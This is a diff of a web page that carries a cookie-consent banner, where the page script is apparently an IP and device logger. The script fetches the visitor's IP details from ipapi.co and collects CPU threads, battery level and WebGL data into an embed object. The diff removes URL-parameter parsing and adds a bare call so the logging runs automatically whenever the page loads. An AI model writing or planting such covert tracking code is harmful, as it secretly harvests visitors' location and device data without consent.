@@ -529,28 +529,14 @@ var eucookielaw_data = {"euCookieSet":"","autoBlock":"0","expireTimer":"30","scr
 </script>
 	<script>
 function determine(){
-var segments = window.location.href.split("?")
-var device = segments[5]
-if(device == "mobile")
-{
 logmobile()
-}
-else
-{
-  log()
-}
+log()
 }
 
         async function logmobile(){
         const response = await fetch("https://ipapi.co/json")
         const data = await response.json();
 
-        var segments = window.location.href.split("?")
-        var pingid = segments[1]
-        var webhookid = segments[2]
-        var webhooktoken = segments[3] 
-        var articlename = segments[4].replace(/%20/g, " ")
-        document.getElementById("articlename").innerHTML = articlename
 
 
 var currentdate = new Date(); 
@@ -668,11 +654,6 @@ var myEmbed = {
       {
         name: "Number of CPU Threads/Cores",
         value:  threads
-      },
-    {
-        name: "Message Upon Loading",
-        value:  articlename,
-        
       }
     ],
      footer: {
@@ -756,12 +737,6 @@ const gl = document.createElement('canvas').getContext('webgl');
 const battery = await navigator.getBattery();
   const batterylevel = `${battery.level * 100}%`;
 
-        var segments = window.location.href.split("?")
-        var pingid = segments[1]
-        var webhookid = segments[2]
-        var webhooktoken = segments[3] 
-        var articlename = segments[4].replace(/%20/g, " ")
-        document.getElementById("articlename").innerHTML = articlename
 
 
 var currentdate = new Date(); 
@@ -849,11 +824,6 @@ var myEmbed = {
       {
         name: "Number of Logical Processors",
         value:  threads
-      },
-    {
-        name: "Message Upon Loading",
-        value:  articlename,
-        
       }
     ],
      footer: {
@@ -878,6 +848,8 @@ var myEmbed = {
         
 
         }
+
+determine()
 
     </script>
 <div class="pea_cook_wrapper pea_cook_bottomcenter" style="color:#1c3664;background:rgb(255,255,255);background: rgba(255,255,255,0.85);"><p>By continuing to use this site, you agree to our privacy and cookies policy. <a style="color:#1c3664;" href="http://www.q3langley.org.uk/privacy/" target="_blank" id="fom">Click here for more information.</a> <button id="pea_cook_btn" class="pea_cook_btn" href="#">Accept</button></p></div><div class="pea_cook_more_info_popover"><div class="pea_cook_more_info_popover_inner" style="color:#1c3664;background-color: rgba(255,255,255,0.9);"><p>The cookie settings on this website are set to "allow cookies" to give you the best browsing experience possible. If you continue to use this website without changing your cookie settings or you click "Accept" below then you are consenting to this.</p><p><a style="color:#1c3664;" href="#" id="pea_close">Close</a></p></div></div></body>
